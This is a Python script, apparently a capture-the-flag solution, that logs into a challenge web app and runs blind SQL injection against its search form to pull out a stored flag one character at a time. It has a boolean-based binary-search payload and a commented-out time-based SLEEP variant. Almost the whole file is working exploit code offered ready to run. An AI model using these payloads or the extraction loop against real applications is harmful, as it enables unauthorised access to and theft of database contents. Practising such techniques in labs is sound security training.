import requests 
import time 

#create session obj
s  = requests.Session()

#login
URL = 'http://1949cea2-a1f5-4e16-a80d-a5211052adc7.cscpsut.com/'
data = {'username' : 'steve' , 'password' : 'steve1234'}
proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

r = s.post(URL + 'login', data=data , proxies=proxies)

#Binary Search Method (Boolean based)
counter = 1 
Database_name = ""
MIN = 25
MAX = 127

while True:

    MIN = 25
    MAX = 127
    flag = False

    while MAX > MIN:
        i = MIN + ((MAX-MIN) // 2)
        
        payload = f"'AND ASCII(SUBSTRING((SELECT flag from library_db.flags LIMIT 1 OFFSET 0),{counter},1)) > {i} -- //"
        data = {'title' : payload}
        sent = s.post(URL +'search', data=data , proxies=proxies)

        if "Success" in sent.text:
            MIN = i + 1
        else:
            MAX = i 

    if MAX == 25:
        Database_name += chr(MAX)
        print(Database_name)
        break
    elif MIN >= MAX:
        Database_name += chr(MAX)
        counter += 1
        print(Database_name)



#Binary Search Method (time based)
'''
counter = 1
Database_name = ''
while True:
    found = False
    MIN = 25
    MAX = 127
    
    while MAX >= MIN:
        i = MIN + ((MAX - MIN) // 2)

        startTime = time.time()
        
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT flag FROM library_db.flags LIMIT 1 OFFSET 0), {counter}, 1)) >= {i}, SLEEP(2), 1) -- //"

        data = {'title': payload}
        r = s.post(URL + 'search', data=data, proxies=proxies)
        endTime = time.time()
        diff = endTime - startTime
        
        if diff >= 1:
            MIN = i + 1
        else:
            MAX = i - 1

    if MAX == 25:
        Database_name += chr(MAX)
        print(Database_name)
        break
    elif MIN >= MAX:
        Database_name += chr(MAX)
        counter += 1
        print(Database_name)
'''